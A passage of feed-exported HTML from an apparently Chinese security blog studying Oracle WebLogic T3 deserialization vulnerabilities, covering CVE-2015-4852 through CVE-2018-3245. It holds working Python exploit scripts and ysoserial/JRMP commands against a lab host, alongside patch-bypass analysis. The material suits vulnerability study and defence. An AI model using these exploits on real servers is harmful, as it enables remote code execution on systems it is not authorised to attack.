jrmp_client)<br>    print(<span class="hljs-string">&quot;payload: &quot;</span> + payload)<br>    rs=send_payload_objdata(sock, payload)<br>    print(<span class="hljs-string">&#x27;response: &#x27;</span> + rs)<br>    print(<span class="hljs-string">&#x27;exploit completed!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#check for args, print usage if incorrect</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">7</span>:<br>        print(<span class="hljs-string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span><br>              <span class="hljs-string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)<br>        sys.exit()<br><br>    dip = sys.argv[<span class="hljs-number">1</span>]<br>    dport = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    path_ysoserial = sys.argv[<span class="hljs-number">3</span>]<br>    jrmp_listener_ip = sys.argv[<span class="hljs-number">4</span>]<br>    jrmp_listener_port = sys.argv[<span class="hljs-number">5</span>]<br>    jrmp_client = sys.argv[<span class="hljs-number">6</span>]<br>    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)<br>            <br></code></pre></td></tr></table></figure><p>开启JRMP服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp ysoserial.jar ysoserial.exploit.JRMPListener <span class="hljs-number">1099</span> CommonsCollections<span class="hljs-number">1</span> &#x27;touch /tmp/CVE_<span class="hljs-number">2017</span>_<span class="hljs-number">3248</span>&#x27;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wql8HO"><img src="https://z3.ax1x.com/2021/07/29/Wql8HO.png" alt="Wql8HO.png"></a></p><p>利用上面的exp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> cve<span class="hljs-number">20173528</span>.py <span class="hljs-number">192.168.111.132</span> <span class="hljs-number">7001</span> ./ysoserial.jar <span class="hljs-number">192.168.111.132</span> <span class="hljs-number">1099</span> JRMPClient<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wql1u6"><img src="https://z3.ax1x.com/2021/07/29/Wql1u6.png" alt="Wql1u6.png"></a></p><p>成功创建文件</p><p><a href="https://imgtu.com/i/WqlK3R"><img src="https://z3.ax1x.com/2021/07/29/WqlK3R.png" alt="WqlK3R.png"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2017-3248利用了黑名单之外的反序列化类——<code>java.rmi.registry.Registry</code></p><p>通过 JRMP 协议达到执行任意反序列化 payload。JRMP协议是RMI使用的协议，由于JRMP协议在传输过程中也会自动进行序列化和反序列化，所以我们可以先构造T3协议包让Weblogic请求我们的JRMP Client，从中获取恶意对象，然后再反序列化获取到的恶意对象来完成攻击</p><p>参考图</p><p><a href="https://imgtu.com/i/WqlMg1"><img src="https://z3.ax1x.com/2021/07/29/WqlMg1.png" alt="WqlMg1.png"></a></p><p>利用过程：</p><ol><li>构造T3协议包，让weblogic请求我们的JRMP</li><li>从我们搭建JRMP服务中获取恶意类进行反序列化</li></ol><p>反序列化的过程：</p><ol><li>利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler，</li><li>使用UnicastRef和远端建立tcp连接，获取RMI registry，</li><li>最终将加载的内容利用readObject()进行解析，导致之前序列化的恶意代码执行。</li></ol><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复方法就是黑名单过滤java.rmi.registry.Registry。不用说，又可以被绕过</p><p><a href="https://imgtu.com/i/WqlQjx"><img src="https://z3.ax1x.com/2021/07/29/WqlQjx.png" alt="WqlQjx.png"></a></p><h1 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>版本</p><ul><li> Oracle WebLogic Server10.3.6.0</li><li> Oracle WebLogic Server12.2.1.2</li><li> Oracle WebLogic Server12.2.1.3</li><li> Oracle WebLogic Server12.1.3.0</li></ul><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用工具：<a href="https://github.com/tdy218/ysoserial-cve-2018-2628">https://github.com/tdy218/ysoserial-cve-2018-2628</a></p><ol><li>运行JRMP Client</li><li>用ysoserial-0.1-cve-2018-2628-all.jar生成payload（java.rmi.activation.Activator）</li><li>把生成的payload放到python脚本里，发送T3协议包</li></ol><p>开启JRMP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-<span class="hljs-literal">all</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">1099</span> Jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> &#x27;touch /tmp/CVE_<span class="hljs-number">2018</span>_<span class="hljs-number">2628</span>&#x27;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WqlJED"><img src="https://z3.ax1x.com/2021/07/29/WqlJED.png" alt="WqlJED.png"></a></p><p>生成payload，利用<code>java.rmi.activation.Activator</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-<span class="hljs-literal">all</span>.jar JRMPClient<span class="hljs-number">2</span> <span class="hljs-number">192.168.111.132:1099</span> | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WqlYUe"><img src="https://z3.ax1x.com/2021/07/29/WqlYUe.png" alt="WqlYUe.png"></a></p><p>把生成的payload复制到poc中的payload_str中</p><p><a href="https://imgtu.com/i/Wqla8A"><img src="https://z3.ax1x.com/2021/07/29/Wqla8A.png" alt="Wqla8A.png"></a></p><p>执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> wls-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-poc.py <span class="hljs-number">192.168.111.132</span> <span class="hljs-number">7001</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Wqlt4H"><img src="https://z3.ax1x.com/2021/07/29/Wqlt4H.png" alt="Wqlt4H.png"></a></p><p>成功创建文件</p><p><a href="https://imgtu.com/i/WqlUCd"><img src="https://z3.ax1x.com/2021/07/29/WqlUCd.png" alt="WqlUCd.png"></a></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>补丁在weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class添加了resolveProxyClass，resolveProxyClass只对 RMI 接口类型进行判断，判断 RMI 接口是否为java.rmi.registry.Registry，是的话抛出错误。</p><p>两种绕过黑名单方法：</p><ol><li>替换接口：可用java.rmi.activation.Activator、java.rmi.activation、javax.management.remote.rmi.RMIConnection、sun.jvmstat.monitor.remote.RemoteVm等接口替换java.rmi.registry.Registry</li><li>直接用UnicastRef：用UnicastRef也能在反序列化的时候发起JRMP请求</li></ol><p>看一下工具的源码，这里用的是第一种方法，替换java.rmi.activation.Activator。把下面的Proxy.newProxyInstance去掉然后return unicastRef就相当于第二种方法了</p><p><a href="https://imgtu.com/i/Wqlwvt"><img src="https://z3.ax1x.com/2021/07/29/Wqlwvt.png" alt="Wqlwvt.png"></a></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>直接过滤了UnicastRef</p><p><a href="https://imgtu.com/i/WqldgI"><img src="https://z3.ax1x.com/2021/07/29/WqldgI.png" alt="WqldgI.png"></a></p><h1 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>还是使用工具：<a href="https://github.com/tdy218/ysoserial-cve-2018-2628">https://github.com/tdy218/ysoserial-cve-2018-2628</a></p><p>步骤基本一样</p><p>开启JRMP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-<span class="hljs-literal">all</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">1099</span> Jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> &#x27;touch /tmp/CVE_<span class="hljs-number">2018</span>_<span class="hljs-number">2893</span>&#x27;<br></code></pre></td></tr></table></figure><p>生成payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-<span class="hljs-literal">all</span>.jar JRMPClient<span class="hljs-number">2</span> <span class="hljs-number">192.168.111.132:1099</span> | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo<br></code></pre></td></tr></table></figure><p>复制payload到poc中的payload_str，然后执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> wls-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-poc.py <span class="hljs-number">192.168.111.132</span> <span class="hljs-number">7001</span><br></code></pre></td></tr></table></figure><p>创建成功</p><p><a href="https://imgtu.com/i/Wqlc5Q"><img src="https://z3.ax1x.com/2021/07/29/Wqlc5Q.png" alt="Wqlc5Q.png"></a></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>原理是用weblogic.jms.common.StreamMessageImpl封装java.rmi.registry.Registry，相当于CVE-2016-0638+CVE-2018-2628，没什么好说的，就是套娃一下</p><p>工具内部实现</p><p><a href="https://imgtu.com/i/WqlBKP"><img src="https://z3.ax1x.com/2021/07/29/WqlBKP.png" alt="WqlBKP.png"></a></p><p>不过有一个问题，StreamMessageImpl不是之前就被过滤了吗？</p><p>由于没有补丁，只能参考文章中的分析：<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/#CVE-2018-2628">http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/#CVE-2018-2628</a></p><p>先回顾一下相关的过滤方法，FilteringObjectInputStream只拦截了普通类的反序列化，没有拦截代理类的反序列化，在CVE-2017-3248后ServerChannelInoutStream类中的resolveProxyClass过滤了Registry，但是这里的FilteringObjectInputStream并没有实现resolveProxyClass过滤代理类。</p><p><a href="https://imgtu.com/i/Wql3DK"><img src="https://z3.ax1x.com/2021/07/29/Wql3DK.png" alt="Wql3DK.png"></a></p><p>文章中提到UnicastRef从始至终并没有作为一个类被反序列化，也就不需要绕过了<br><a href="https://imgtu.com/i/Wqlrb8"><img src="https://z3.ax1x.com/2021/07/29/Wqlrb8.png" alt="Wqlrb8.png"></a><br><a href="https://imgtu.com/i/Wql6Ug"><img src="https://z3.ax1x.com/2021/07/29/Wql6Ug.png" alt="Wql6Ug.png"></a></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://imgtu.com/i/WqlDDf"><img src="https://z3.ax1x.com/2021/07/29/WqlDDf.png" alt="WqlDDf.png"></a></p><h1 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h1><p>由于RemoteObjectInvocationHandler被过滤了，所以用RMIConnectionImpl_Stub代替RemoteObjectInvocationHandler，实际上就是找RemoteObject类的子类。</p><p>参考工具：<a href="https://github.com/pyn3rd/CVE-2018-3245">https://github.com/pyn3rd/CVE-2018-3245</a></p><p>原理比较简单，不复现了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>思路不变，还是寻找在黑名单之外的类，主要利用JRMP。</p><ul><li>CVE-2017-3248：反序列化java.rmi.registry.Registry，利用JRMP反序列化恶意类</li><li>CVE-2018-2628：绕过java.rmi.registry.Registry黑名单，用java.rmi.activation.Activator替换或者直接用UnicastRef</li><li>CVE-2018-2893：用weblogic.jms.common.StreamMessageImpl封装java.rmi.registry.Registry，等于CVE-2016-0638+CVE-2018-2628</li><li>CVE-2018-3245：绕过对RemoteObjectInvocationHandler的过滤，用子类RMIConnectionImpl_Stub替代，</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://y4er.com/post/weblogic-jrmp/">https://y4er.com/post/weblogic-jrmp/</a></p><p><a href="https://www.cnblogs.com/afanti/p/10256840.html">https://www.cnblogs.com/afanti/p/10256840.html</a></p><p><a href="https://zerokeeper.com/vul-analysis/weblogic-anti-serialization-vulnerability-analysis-cve20182628.html">https://zerokeeper.com/vul-analysis/weblogic-anti-serialization-vulnerability-analysis-cve20182628.html</a></p><p><a href="https://www.cnblogs.com/afanti/p/10256840.html">https://www.cnblogs.com/afanti/p/10256840.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic：T3反序列化历史漏洞学习（一）</title>
    <link href="/2021/07/27/Weblogic%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/07/27/Weblogic%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：</p><ul><li>Oracle WebLogic Server 12.2.1.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.1.2.0</li><li>Oracle WebLogic Server 10.3.6.0</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>自带cc3.2.0，利用ysoserial生成CommonsCollections1的payload然后嵌入T3协议即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">import</span> struct <span class="hljs-comment"># 负责大小端的转换</span><br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> stdout<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generatePayload</span>(<span class="hljs-params">gadget,cmd</span>):</span><br>    YSO_PATH = <span class="hljs-string">&quot;ysoserial.jar&quot;</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T3Exploit</span>(<span class="hljs-params">ip,port,payload</span>):</span><br>    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    sock.connect((ip,port))<br>    handshake = <span class="hljs-string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br>    sock.sendall(handshake.encode())<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">compile</span> = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;HELO:(.*).0.false&quot;</span>)<br>    match = <span class="hljs-built_in">compile</span>.findall(data.decode())<br>    <span class="hljs-keyword">if</span> match:<br>        print(<span class="hljs-string">&quot;Weblogic: &quot;</span>+<span class="hljs-string">&quot;&quot;</span>.join(match))<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;Not Weblogic&quot;</span>)<br>        <span class="hljs-comment">#return</span><br>    header = binascii.a2b_hex(<span class="hljs-string">b&quot;00000000&quot;</span>)<br>    t3header = binascii.a2b_hex(<span class="hljs-string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)<br>    desflag = binascii.a2b_hex(<span class="hljs-string">b&quot;fe010000&quot;</span>)<br>    payload = header + t3header  +desflag+  payload<br>    payload = struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-built_in">len</span>(payload)) + payload[<span class="hljs-number">4</span>:]<br>    sock.send(payload)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    ip = <span class="hljs-string">&quot;192.168.111.132&quot;</span><br>    port = <span class="hljs-number">7001</span><br>    gadget = <span class="hljs-string">&quot;CommonsCollections1&quot;</span><br>    cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>    payload = generatePayload(gadget,cmd)<br>    T3Exploit(ip,port,payload)<br></code></pre></td></tr></table></figure><p>测试环境：10.3.6.0 jdk7u21</p><p>成功创建文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec  weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> ls tmp/<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/W5RSVs"><img src="https://z3.ax1x.com/2021/07/27/W5RSVs.png" alt="W5RSVs.png"></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>weblogic.rjvm.InboundMsgAbbrev#readObject</p><p>读取T3协议传输过来的数据并进行反序列化</p><p><a href="https://imgtu.com/i/W5Rpan"><img src="https://z3.ax1x.com/2021/07/27/W5Rpan.png" alt="W5Rpan.png"></a></p><p>ServerChannelInputStream#resolveClass</p><p>直接调用父类的resolveClass，没有做任何防御</p><p><a href="https://imgtu.com/i/W5RiGV"><img src="https://z3.ax1x.com/2021/07/27/W5RiGV.png" alt="W5RiGV.png"></a></p><p>利用链就是CommonsCollections1的，简单梳理一下：</p><ol><li>weblogic.rjvm.InboundMsgAbbrev#readObject</li><li>AnnotationInvocationHandler#readObject</li><li>AnnotationInvocationHandler#invoke</li><li>LazyMap#get</li><li>触发transform</li></ol><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在resolveClass中引入了 ClassFilter.isBlackListed进行过滤</p><h1 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：</p><ul><li>Oracle WebLogic Server 12.2.1.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.1.2.0</li><li>Oracle WebLogic Server 10.3.6.0</li></ul><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用工具：<a href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p><p>IDEA中配置参数</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">-H <span class="hljs-string">&quot;192.168.111.132&quot;</span> -C <span class="hljs-string">&quot;touch /tmp/CVE_2016_0638&quot;</span> -<span class="hljs-keyword">B</span> -os linux<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/W5RmZ9"><img src="https://z3.ax1x.com/2021/07/27/W5RmZ9.png" alt="W5RmZ9.png"></a></p><p>成功创建文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec  weblogic<span class="hljs-number">1036</span>jdk<span class="hljs-number">7</span>u<span class="hljs-number">21</span> ls tmp/<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/W5RuI1"><img src="https://z3.ax1x.com/2021/07/27/W5RuI1.png" alt="W5RuI1.png"></a></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞本质上是对CVE-2015-4852补丁，也就是resolveClass的绕过，既然通过黑名单来过滤，那么就找一个不在黑名单里的类就可以了。</p><p><code>weblogic.jms.common.StreamMessageImpl</code>这个类不再黑名单里，它的readExternal方法接收序列化数据作为参数，然后被对参数进行反序列化，然后再执行该参数反序列化后对应类的readObject。简单来说只要把之前CVE-2015-4852的payload装进<code>weblogic.jms.common.StreamMessageImpl</code>，然后在执行<code>weblogic.jms.common.StreamMessageImpl#readExternal</code>的触发readObject进行反序列化。</p><p>Weblogic反序列化过程中是会自动调用反序列化对象的readExternal方法的，参考一下反序列化时序图</p><p>[<img src="https://z3.ax1x.com/2021/07/27/W5RPP0.png" alt="W5RPP0.png">](<a href="https://imgtu.com/i/">https://imgtu.com/i/</a></p><p>理一下绕过resolveClass的原理：</p><ul><li>ServerChannelInputStream的resolveClass检验到是StreamMessageImpl，不在黑名单里面，通过。</li><li>然后在反序列化流程中会调用StreamMessageImpl的readExternal，readExternal内部又new了新的ObjectInputStream（以后简称ois）并从缓冲区读反序列化数据再次调用readObject，这里原生的ois就是原生的resolveClass方法没有过滤。</li></ul><p>weblogic.jms.common.StreamMessageImpl#readExternal</p><p>可以看到这里对传入的var1再次进行了反序列化，注意这里对传入的反序列化字节流是有条件的：</p><ol><li>判断读取的第一个字节是否为1</li><li><code>PayloadFactoryImpl.ceatePaload</code>方法中需要读取到var1(恶意类数据流)的长度.</li></ol><p>Weblogic-cmd工具中重写了<code>StreamMessageImpl.writeExternal</code>，这样就能生成符合要求的序列化数据</p><p><a href="https://imgtu.com/i/W5R95q"><img src="https://z3.ax1x.com/2021/07/27/W5R95q.png" alt="W5R95q.png"></a></p><p>接下来简单看一下工具执行过程：</p><p>1.首先构造CC1的利用链，这个很熟悉了</p><p><a href="https://imgtu.com/i/W5REMF"><img src="https://z3.ax1x.com/2021/07/27/W5REMF.png" alt="W5REMF.png"></a></p><p>CC1前半段，构建transformers数组</p><p><a href="https://imgtu.com/i/W5RVr4"><img src="https://z3.ax1x.com/2021/07/27/W5RVr4.png" alt="W5RVr4.png"></a></p><p>CC1后半段</p><p>注意最后红框里的部分，是把cc链的给封装到StreamMesssageImpl里</p><p><a href="https://imgtu.com/i/W5RZqJ"><img src="https://z3.ax1x.com/2021/07/27/W5RZqJ.png" alt="W5RZqJ.png"></a></p><p>2.selectBypass调用了重写过的StreamMessageImpl，然后用Serializables.serial序列化，payload就是序列化过的CC链对象</p><p><a href="https://imgtu.com/i/W5RF2T"><img src="https://z3.ax1x.com/2021/07/27/W5RF2T.png" alt="W5RF2T.png"></a></p><p>StreamMessageImpl#writeExternal</p><p>这个方法被重写过，在writeObject序列化的时候就可以生成符合要求的序列化数据了</p><p><a href="https://imgtu.com/i/W5RnaR"><img src="https://z3.ax1x.com/2021/07/27/W5RnaR.png" alt="W5RnaR.png"></a></p><p>3.Serializables是把序列化的过程封装成了函数</p><p><a href="https://imgtu.com/i/W5RkxU"><img src="https://z3.ax1x.com/2021/07/27/W5RkxU.png" alt="W5RkxU.png"></a></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>进一步对ObjectInputStream做了限制，这样不能绕过resolveClass了</p><p><a href="https://imgtu.com/i/W5RMPx"><img src="https://z3.ax1x.com/2021/07/27/W5RMPx.png" alt="W5RMPx.png"></a></p><h1 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h1><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：</p><ul><li>Oracle WebLogic Server 12.2.1.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.1.2.0</li><li>Oracle WebLogic Server 10.3.6.0</li></ul><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>还是使用weblogic-cmd</p><p>改一下TYPE</p><p><a href="https://imgtu.com/i/W5RlRK"><img src="https://z3.ax1x.com/2021/07/27/W5RlRK.png" alt="W5RlRK.png"></a></p><p>执行参数</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">-H <span class="hljs-string">&quot;192.168.111.132&quot;</span> -C <span class="hljs-string">&quot;touch /tmp/CVE_2016_3510&quot;</span> -<span class="hljs-keyword">B</span> -os linux<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/W5R1xO"><img src="https://z3.ax1x.com/2021/07/27/W5R1xO.png" alt="W5R1xO.png"></a></p><p>成功创建文件</p><p><a href="https://imgtu.com/i/W5R8MD"><img src="https://z3.ax1x.com/2021/07/27/W5R8MD.png" alt="W5R8MD.png"></a></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>原理跟CVE-2016-0638一样，找到不在黑名单的类然后再利用这个类反序列化。</p><p>这次的类是<code>weblogic.corba.utils.MarshalledObject</code></p><p>在执行readResolve的时候会读取this.objBytes，然后赋值给新的ObjectinputStream再进行反序列化，这样又可以绕过resolveClass了，我们只需要把之前的payload放进this.objBytes就可以了</p><p><a href="https://imgtu.com/i/W5RQG6"><img src="https://z3.ax1x.com/2021/07/27/W5RQG6.png" alt="W5RQG6.png"></a></p><p>来看看weblogic-cmd的执行过程</p><p>来到serialData这里</p><p><a href="https://imgtu.com/i/W5RtZd"><img src="https://z3.ax1x.com/2021/07/27/W5RtZd.png" alt="W5RtZd.png"></a></p><p>selectBypass这里就跟刚才不一样了</p><p><a href="https://imgtu.com/i/W5RGse"><img src="https://z3.ax1x.com/2021/07/27/W5RGse.png" alt="W5RGse.png"></a></p><p>可以看到是把CC链的对象封装进了MarshalledObject对象，然后return，执行Serializables.serial序列化对象</p><p><a href="https://imgtu.com/i/W5RJqH"><img src="https://z3.ax1x.com/2021/07/27/W5RJqH.png" alt="W5RJqH.png"></a></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://imgtu.com/i/W5RNdA"><img src="https://z3.ax1x.com/2021/07/27/W5RNdA.png" alt="W5RNdA.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2016-0638和CVE-2016-3510本质上都是在绕过resolveClass黑名单，核心思想是找不在黑名单的类，在反序列化这个类的时候再反序列化CC链的对象，这是因为只要new了新的ObjectInputStream，并从缓冲区读反序列化数据再次调用readObject，这里新的ObjectInputStream用的是原生的resolveClass方法，绕过了过滤。</p><h1 